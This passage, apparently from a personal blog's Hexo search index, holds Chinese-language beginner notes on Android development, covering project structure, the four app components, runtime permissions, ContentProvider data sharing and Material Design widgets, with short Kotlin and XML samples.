<li>build.gradle<br>这是app模块的gradle构建脚本，这个文件会指定很多项目构建相关的配置，我们稍后会详细缝隙gradle构建脚本的具体内容。</li>
<li>proguard-rules.pro<br>这个文件用于指定项目代码的混淆规则，当代码开发完成打包成安装包文件时，如果不希望代码被人破解，可以将代码混淆，让他人难以阅读</li>
</ul>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>目录结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(2)</title>
    <url>/posts/18adafad/</url>
    <content><![CDATA[<p><em><strong>Android四大组件分别是Activity,Service,BroadcastRecerver和ContentProvider。</strong></em></p>
<ul>
<li><p>其中<strong>Activity</strong>是所有Android应用程序的门面，你再前端看得到的都在这其中。</p>
</li>
<li><p>而<strong>Service</strong>就是在后台默默运行，即便用户退出了应用，Service也会在后台运行。</p>
</li>
<li><p><strong>BroadcastReceiver</strong>允许你的应用接受来自各处的广播消息，比如电话，短信等，当然，你的应用也可以向外发出广播信息。</p>
</li>
<li><p><strong>ContentProvider</strong>则为应用程序之间共享数据提供了可能，比如你想读取系统通讯录中的联系人，即想要通过ContentProvider来实现。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>四大组件</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(0)</title>
    <url>/posts/2a9bcd2f/</url>
    <content><![CDATA[<p>IDEA是一款非常强大的编译器，而且大家常用的<code>AndroidStudio</code>就是基于IDEA开发出来的，因此无论是使用<code>Android Studion</code>还是IDEA都会非常的熟练，他们的快捷键等都几乎保持一致。<br>因此无论是使用idea或者android studio都没有问题。这里我选择使用idea。就不多再下载一个编译器了。<br>使用过程</p>
<ol>
<li>首先需要安装android SDK<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(0)-2023-06-06-00-38.png"><br>他会要求你进行下载，当你下载完成后，你就可以使用idea开发android了</li>
<li>如果是旧UI的话，就可以在开发Android时自己选择模拟的设备了，如图<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(0)-2023-06-11-33-08.png"><br>而如果更换了新UI就不会显示这个，你需要通过<code>更多工具</code>获得<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(0)-2023-06-21-36-13.png"><br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(0)-2023-06-17-35-27.png"><br>选择这些工具后，他们就会出现在右栏或者底栏，就可以方便的使用了。</li>
<li>logcat的使用<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(0)-2023-06-18-28-14.png"><br>最重要的是他的筛选工具，他可以筛选log的等级，和包名</li>
</ol>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(ContentProvider)不同应用共享数据</title>
    <url>/posts/3287078c/</url>
    <content><![CDATA[<p><strong>ContentProvider主要用于在不同的应用程序之间实现数据共享的功能</strong></p>
<h2 id="运行时权限"><a href="#运行时权限" class="headerlink" title="运行时权限"></a>运行时权限</h2><p>这是ContentProvider能否使用的基础.<br>运行时权限的意义：在旧版android中，所有的权限都是在应用安装时会直接声明出来，如果你接受这些条件就安装。否则拒绝安装就可以了。而这就会导致一些店大欺客的问题。比如：旧版微信就会申请几乎所有的权限。而你如果不接受你就不能使用微信。</p>
<p>所以运行时权限就有了他存在的意义：应用会在需要使用该权限时才会像用户发起申请，即便用户拒绝了，也可以正常使用其他功能。<br>当然，并不是所有权限都需要在运行时申请，对于用户来说，不停地授权也很烦琐。Android现在将常用的权限大致归成了两类，一类是普通权限，一类是危险权限。对于普通权限，系统会帮我们自动授权。而危险权限都交给用户决定。<br>以下是Android到Android10版本所有的危险权限：<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(ContentProvider)%E4%B8%8D%E5%90%8C%E5%BA%94%E7%94%A8%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE-2023-07-15-08-15.png"></p>
<p>运行时权限申请样例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> binding: ActivityFirstBinding</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityFirstBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        binding.apply &#123;</span><br><span class="line">            callme.setOnClickListener &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 判断是否拥有拨打电话的权限</span></span><br><span class="line"><span class="comment">                 * ContextCompat.checkSelfPermission()接收两个参数，第一个是context。第二个是具体的权限名</span></span><br><span class="line"><span class="comment">                 * PackageManager.PERMISSION_GRANTED是个常量表示用户完成授权</span></span><br><span class="line"><span class="comment">                 * ActivityCompat.requestPermissions()接收三个参数，第三个参数没有具体要求，只要是唯一值即可</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">if</span> (ContextCompat.checkSelfPermission(</span><br><span class="line">                        <span class="built_in">this</span><span class="meta">@FirstActivity</span>,</span><br><span class="line">                        android.Manifest.permission.CALL_PHONE</span><br><span class="line">                    ) != PackageManager.PERMISSION_GRANTED</span><br><span class="line">                ) &#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(</span><br><span class="line">                        <span class="built_in">this</span><span class="meta">@FirstActivity</span>,</span><br><span class="line">                        arrayOf(android.Manifest.permission.CALL_PHONE),</span><br><span class="line">                        <span class="number">1</span></span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    call()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不难理解，所以不做解释</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    override fun <span class="title function_">onRequestPermissionsResult</span><span class="params">(requestCode: Int, permissions: Array&lt;out String&gt;, grantResults: IntArray)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults)</span><br><span class="line">        <span class="keyword">when</span>(requestCode)&#123;</span><br><span class="line">            <span class="number">1</span>-&gt;&#123;</span><br><span class="line">                <span class="keyword">if</span>(grantResults.isNotEmpty() &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    call()</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(<span class="built_in">this</span><span class="meta">@FirstActivity</span>,<span class="string">&quot;You deny your Permission&quot;</span>,Toast.LENGTH_LONG).show()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(Intent.ACTION_CALL)</span><br><span class="line">            intent.data = Uri.parse(<span class="string">&quot;tel:10086&quot;</span>)</span><br><span class="line">            startActivity(intent)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="访问其他应用的数据"><a href="#访问其他应用的数据" class="headerlink" title="访问其他应用的数据"></a>访问其他应用的数据</h2><p>ContentProvider的使用：</p>
<ol>
<li>他想要获取数据就需要借助ContentResolver类。可以通过Context中的getContentResolver()方法获取实例。</li>
<li>ContentResolver类与<code>SQLiteDatabase</code>类似，也具有<code>insert()</code>,等四个增删改查方法。</li>
<li>但不同于<code>SQLiteDatabase</code>，他第一个参数接收的不是表名，而是<code>Uri</code>参数。它由三部分组成：协议，authority，path。authority是用于对不同的应用程序做区分的，一般为了避免冲突，会采用应用包名的方式进行命名。path就是对同一应用不同的表做区分，就像表名。它的比较标准的格式如下：<code>content://com.example.app.provider/table1</code>。只需要调用Uri.parse()方法，就可以将内容URI字符串解析成Uri对象了</li>
<li><ul>
<li>query()<br>  <img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(ContentProvider)%E4%B8%8D%E5%90%8C%E5%BA%94%E7%94%A8%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE-2023-07-03-27-32.png"><br>  它与数据库的参数很像，就是第一个不是表名，而是Uri。而且他的参数会更加简单一点。<br>  它返回的也是一个cursor对象，对于cursor对象，只需要遍历，并且按照列数完成对每一列的读取即可。</li>
<li>insert()  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">values</span> <span class="operator">=</span> contentValuesOf(<span class="string">&quot;column1&quot;</span> to <span class="string">&quot;text&quot;</span>, <span class="string">&quot;column2&quot;</span> to <span class="number">1</span>)</span><br><span class="line">contentResolver.insert(uri, values)</span><br></pre></td></tr></table></figure>
  它接收是也是Uri对象和contentValues对象。</li>
<li>update()  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">values</span> <span class="operator">=</span> contentValuesOf(<span class="string">&quot;column1&quot;</span> to <span class="string">&quot;&quot;</span>)</span><br><span class="line">contentResolver.update(uri, values, <span class="string">&quot;column1 = ? and column2 = ?&quot;</span>, arrayOf(<span class="string">&quot;text&quot;</span>, <span class="string">&quot;1&quot;</span>))</span><br></pre></td></tr></table></figure>
  这里使用了selection和selectionArgs参数来对想要更新的数据进行约束</li>
<li>delete()  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">contentResolver.delete(uri, <span class="string">&quot;column2 = ?&quot;</span>, arrayOf(<span class="string">&quot;1&quot;</span>))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="构建自己的ContentProvider"><a href="#构建自己的ContentProvider" class="headerlink" title="构建自己的ContentProvider"></a>构建自己的ContentProvider</h2><p>已知：只需要获得该应用程序的内容URI，然后借助ContentResolver进行增删改查操作就可以了，但是如何向外部提供接口并保证数据的安全？<br>步骤：</p>
<ol>
<li>新建一个类继承ContentProvider，然后重写其6个抽象方法。<br>(1) onCreate()。初始化ContentProvider的时候调用。通常会在这里完成对数据库的创建和升级等操作，返回true表示ContentProvider初始化成功，返回false则表示失败。</li>
</ol>
<p>(2) query()。从ContentProvider中查询数据。uri参数用于确定查询哪张表，projection参数用于确定查询哪些列，selection和selectionArgs参数用于约束查询哪些行，sortOrder参数用于对结果进行排序，查询的结果存放在Cursor对象中返回。</p>
<p>(3) insert()。向ContentProvider中添加一条数据。uri参数用于确定要添加到的表，待添加的数据保存在values参数中。添加完成后，返回一个用于表示这条新记录的URI。</p>
<p>(4) update()。更新ContentProvider中已有的数据。uri参数用于确定更新哪一张表中的数据，新数据保存在values参数中，selection和selectionArgs参数用于约束更新哪些行，受影响的行数将作为返回值返回。</p>
<p>(5) delete()。从ContentProvider中删除数据。uri参数用于确定删除哪一张表中的数据，selection和selectionArgs参数用于约束删除哪些行，被删除的行数将作为返回值返回。</p>
<p>(6) getType()。根据传入的内容URI返回相应的MIME类型。</p>
<ol start="2">
<li>uri解析<br>一个标准的uri写法<br><code>content://com.example.app.provider/table1</code><br>这就表示调用方期望访问的是com.example.app这个应用的table1表中的数据。<br><code>content://com.example.app.provider/table1/1</code><br>表示调用方期望访问的是com.example.app这个应用的table1表中id为1的数据</li>
</ol>
<ul>
<li>*表示匹配任意长度的任意字符。</li>
<li><code>#</code>表示匹配任意长度的数字。</li>
</ul>
<p>一个能够匹配任意表的内容URI格式就可以写成：<br><code>content://com.example.app.provider/*</code><br>一个能够匹配table1表中任意一行数据的内容URI格式就可以写成：<br><code>content://com.example.app.provider/table1/#</code></p>
<p><code>UriMatcher</code>类有两个方法：</p>
<ul>
<li>addURI()：接收三个参数分别把authority,path和一个<strong>自定义代码</strong>传进去</li>
<li>match()：接收一个uri对象作为参数。能够匹配到这个uri对象的<strong>自定义代码</strong></li>
</ul>
<p>URI所对应的MIME字符串主要由3部分组成，Android对这3个部分做了如下格式规定。</p>
<ul>
<li>必须以vnd开头。</li>
<li>如果内容URI以路径结尾，则后接<code>android.cursor.dir/</code>；如果内容URI以id结尾，则后</li>
<li>接<code>android.cursor.item/</code>。</li>
<li>最后接上vnd.<authority>.<path>。</li>
</ul>
<p><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(ContentProvider)%E4%B8%8D%E5%90%8C%E5%BA%94%E7%94%A8%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE-2023-07-16-22-06.png"></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(Material Design)</title>
    <url>/posts/2026a548/</url>
    <content><![CDATA[<h1 id="一套全新的界面设计语言——Material-Design"><a href="#一套全新的界面设计语言——Material-Design" class="headerlink" title="一套全新的界面设计语言——Material Design"></a>一套全新的界面设计语言——Material Design</h1><h2 id="Toolbor"><a href="#Toolbor" class="headerlink" title="Toolbor"></a>Toolbor</h2><p>不仅仅继承了ActionBar的所有功能，而且灵活性很高，可以配合其他控件完成一些Material Design的效果.</p>
<blockquote>
<p>任何一个新建的项目都会默认支持ActionBar，他被在<code>AndroidManifest</code>中声明，也就是被定义在了<code>android:theme=&quot;@style/AppTheme&quot;&gt;</code>主题中。他的默认配置如下：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- Base application theme. --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">&quot;AppTheme&quot;</span> <span class="attr">parent</span>=<span class="string">&quot;Theme.AppCompat.Light.DarkActionBar&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"> <span class="comment">&lt;!-- Customize your theme here. --&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;colorPrimary&quot;</span>&gt;</span>@color/colorPrimary<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;colorPrimaryDark&quot;</span>&gt;</span>@color/colorPrimaryDark<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;colorAccent&quot;</span>&gt;</span>@color/colorAccent<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中的color是配置颜色的，这有一张颜色配置的图<br>![](<a href="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8">https://image.zfxt.top/hexo-blog/Android入门</a>(Material Design)-2023-08-04-08-42.png)</p>
<h3 id="设置Toolbar"><a href="#设置Toolbar" class="headerlink" title="设置Toolbar"></a>设置Toolbar</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">androidx.appcompat.widget.Toolbar</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:id</span>=<span class="string">&quot;@+id/toolbar&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:layout_height</span>=<span class="string">&quot;?attr/actionBarSize&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:background</span>=<span class="string">&quot;@color/design_default_color_primary&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:theme</span>=<span class="string">&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:popupTheme</span>=<span class="string">&quot;@style/ThemeOverlay.AppCompat.Light&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>理解一下上述代码的内容。使用了<code>xmlns:app</code>指定了一个新的命名空间，我们就可以使用<code>app:attribute</code>这样的写法了。<br>但是为什么要加入<code>xmlns:app</code>呢？因为很多Material属性是老系统不存在的，为了能够兼容老系统。就不能使用<code>android:attribute</code>这样的写法了，而是应该使用<code>app:attribute</code>。<br>Toolbar控件，这个控件是由appcompat库提供的。他的theme是为了单独设置toolbar的主题色，浅色或者深色。这里可以设置深色主题，但是如果有菜单按钮，那么弹出的菜单也变成深色，就会变得很难看。所以这里<code>app:popupTheme=&quot;@style/ThemeOverlay.AppCompat.Light&quot;/&gt;</code>就是设置弹出框为浅色主题</p>
<h3 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h3><ol>
<li>添加按钮<br> 右击res目录→New→Directory，创建一个menu文件夹。然后右击menu文件夹→New→Menu resource file，创建一个toolbar.xml文件，并编写如下代码：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">	  <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:id</span>=<span class="string">&quot;@+id/backup&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:icon</span>=<span class="string">&quot;@drawable/loibus10&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:title</span>=<span class="string">&quot;Backup&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:showAsAction</span>=<span class="string">&quot;always&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:id</span>=<span class="string">&quot;@+id/delete&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:icon</span>=<span class="string">&quot;@drawable/loibus11&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:title</span>=<span class="string">&quot;Delete&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:showAsAction</span>=<span class="string">&quot;ifRoom&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:id</span>=<span class="string">&quot;@+id/settings&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:icon</span>=<span class="string">&quot;@drawable/loibus12&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:title</span>=<span class="string">&quot;Settings&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:showAsAction</span>=<span class="string">&quot;never&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>
使用<code>app:showAsAction</code>来指定按钮的显示位置，这里之所以再次使用了app命名空间，同样是为了能够兼容低版本的系统。showAsAction主要有以下几种值可选：always表示永远显示在Toolbar中，如果屏幕空间不够则不显示；ifRoom表示屏幕空间足够的情况下显示在Toolbar中，不够的话就显示在菜单当中；never则表示永远显示在菜单当中。<strong>注意，Toolbar<br>中的action按钮只会显示图标，菜单中的action按钮只会显示文字</strong><br>然后再activity中配置按钮的逻辑<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreateOptionsMenu</span><span class="params">(menu: Menu?)</span>: Boolean &#123;</span><br><span class="line">        menuInflater.inflate(R.menu.toolbar, menu)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onOptionsItemSelected</span><span class="params">(item: MenuItem)</span>: Boolean &#123;</span><br><span class="line">        <span class="keyword">when</span> (item.itemId) &#123;</span><br><span class="line">            R.id.backup -&gt; Toast.makeText(</span><br><span class="line">                <span class="built_in">this</span>, <span class="string">&quot;You clicked Backup&quot;</span>, Toast.LENGTH_SHORT</span><br><span class="line">            ).show()</span><br><span class="line"></span><br><span class="line">            R.id.delete -&gt; Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;You clicked Delete&quot;</span>, Toast.LENGTH_SHORT).show()</span><br><span class="line"></span><br><span class="line">            R.id.settings -&gt; Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;You clicked Settings&quot;</span>, Toast.LENGTH_SHORT).show()</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
先注册，再配置逻辑功能。</li>
</ol>
<h2 id="滑动菜单"><a href="#滑动菜单" class="headerlink" title="滑动菜单"></a>滑动菜单</h2><h3 id="Drawerlayout"><a href="#Drawerlayout" class="headerlink" title="Drawerlayout"></a>Drawerlayout</h3><p>首先，他是一个布局，在布局中允许放入两个直接子控件：第一个是主屏幕显示的内容。第二个是滑动菜单中显式的内容。<br><strong>但是关于第二个子控件有一点需要注意，layout_gravity这个属性是必须指定的，因为我们需要告诉DrawerLayout滑动菜单是在屏幕的左边还是右边，指定left表示滑动菜单在左边，指定right表示滑动菜单在右边。指定了start，表示会根据系统语言进行判断，如果系统语言是从左往右的，比如英语、汉语，滑动菜单就在左边，如果系统语言是从右往左的，比如阿拉伯语，滑动菜单就在右边。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setSupportActionBar(binding.toolbar)</span><br><span class="line">        supportActionBar?.let &#123;</span><br><span class="line">            it.setDisplayHomeAsUpEnabled(<span class="literal">true</span>)</span><br><span class="line">            it.setHomeAsUpIndicator(R.drawable.loibus16)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码的作用是在ActionBar不为空的情况下调用setDisplayHomeAsUpEnabled()方法让导航按钮显示出来，调用setHomeAsUpIndicator()方法来设置一个导航按钮图标。<br>实际上，ToolBar最左侧的按钮被称为Home按钮，默认为一个返回的箭头，作用是返回上一个activity。而且这给按钮的id永远是<code>android.R.id.home</code>，这是系统内定的，我们在为其设置相应的逻辑<code>android.R.id.home-&gt;binding.drawerLayout.openDrawer(GravityCompat.START)</code>。</p>
<h3 id="NavigationView"><a href="#NavigationView" class="headerlink" title="NavigationView"></a>NavigationView</h3><p>可以在滑动菜单页面定制任意的布局。<br>他需要再导入两个包，</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Material库</span></span><br><span class="line">implementation(<span class="string">&quot;com.google.android.material:material:1.9.0&quot;</span>)</span><br><span class="line"><span class="comment">//开源项目CircleImageView，它可以用来轻松实现图片圆形化的功能</span></span><br><span class="line">implementation(<span class="string">&quot;de.hdodenhof:circleimageview:3.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，当你引入了Material库之后，还需要将res&#x2F;values&#x2F;styles.xml文件中AppTheme的parent主题改成Theme.MaterialComponents.Light.NoActionBar，否则在使用接下来的一些控件时可能会遇到崩溃问题。</p>
</blockquote>
<p>使用NavigationView，要准备好menu和headerLayout。前者是用来再NavigationView显示菜单项的，后者是用来在NavigationView定义头部的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.google.android.material.navigation.NavigationView</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:id</span>=<span class="string">&quot;@+id/navView&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:layout_gravity</span>=<span class="string">&quot;start&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:menu</span>=<span class="string">&quot;@menu/nav_menu&quot;</span></span></span><br><span class="line"><span class="tag">			<span class="attr">app:headerLayout</span>=<span class="string">&quot;@layout/nav_header&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是为Drawerlayout配置NavigationView，其中声明好了menu和headerLayout。<br>配置menu时，需要注意的是</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">android:checkableBehavior</span>=<span class="string">&quot;single&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的配置表明只能单选。<br>最后在activity中配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">binding.navView.setCheckedItem(R.id.navCall)</span><br><span class="line">        binding.navView.setNavigationItemSelectedListener &#123;</span><br><span class="line">            binding.drawerLayout.closeDrawers()</span><br><span class="line">            <span class="literal">true</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这里先设置了默认选择项，然后配置他们所有选项的逻辑。这里所有的逻辑都是关闭滑动菜单</p>
<h3 id="还有很多特性，不一一列举，看过一遍就不再记笔记了。这些都可以网上轻松找到代码"><a href="#还有很多特性，不一一列举，看过一遍就不再记笔记了。这些都可以网上轻松找到代码" class="headerlink" title="还有很多特性，不一一列举，看过一遍就不再记笔记了。这些都可以网上轻松找到代码"></a>还有很多特性，不一一列举，看过一遍就不再记笔记了。这些都可以网上轻松找到代码</h3><ol>
<li><p>悬浮按钮（FloatingActionButton）</p>
</li>
<li><p>可交互提示Snackbar</p>
</li>
<li><p>CoordinatorLayout（加强版的FrameLayout）</p>
</li>
</ol>
<p>CoordinatorLayout可以监听其所有子控件的各种事件，并自动帮助我们做出最为合理的响应。举个简单的例子，刚才弹出的Snackbar提示将悬浮按钮遮挡住了，而如果我们能让CoordinatorLayout监听到Snackbar的弹出事件，那么它会自动将内部的<br>FloatingActionButton向上偏移，从而确保不会被Snackbar遮挡。</p>
<ol start="4">
<li><p>glide<br><code>implementation &#39;com.github.bumptech.glide:glide:4.9.0&#39;</code><br>Glide是一个超级强大的开源图片加载库，它不仅可以用于加载本地图片，还可以加载网络图片、GIF图片甚至是本地视频。<br>而且Glide的用法很简单。首先调用Glide.with()方法并传入一个Context、Activity或Fragment参数，然后调用load()方法加载图片，可以是一个URL地址，也可以是一个本地路径，或者是一个资源id，最后调用into()方法将图片设置到具体某一个ImageView中就可以了。</p>
</li>
<li><p>卡片式布局（MaterialCardView）</p>
</li>
<li><p>ImageView中我们使用了一个scaleType属性，这个属性可以指定图片的缩放模式。</p>
</li>
<li><p>为了让所有的图片都能填充满整个ImageView，这里使用了centerCrop模式，它可以让图片保持原有比例填充满ImageView，并将超出屏幕的部分裁剪掉</p>
</li>
<li><p>AppBarLayout,与<code>app:layout_behavior</code>指定布局<code>appbar_scrolling_view_behavior</code>。相互配合。<br><code>app:layout_scrollFlags</code>在Toolbar中添加了一个<code>app:layout_scrollFlags</code>属性，并将这个属性的值指定成了scroll|enterAlways|snap。其中，scroll表示当RecyclerView向上滚动的时候，Toolbar会跟着一起向上滚动并实现隐藏；enterAlways表示当RecyclerView向下滚动的时候，Toolbar会跟着一起向下滚动并重新显示；snap表示当Toolbar还没有完全隐藏或显示的时候，会根据当前滚动的距离，自动选择是隐藏还是显示。</p>
</li>
<li><p>下拉刷新，首先需要导入相关的类<code>implementation(&quot;androidx.swiperefreshlayout:swiperefreshlayout:1.0.0&quot;)</code><br>通过这个类。。只要在需要设置刷新的模块上套上一层swiperefreshlayout就可以实现下拉功能。然后我们需要在activity中设置他的逻辑功能。</p>
</li>
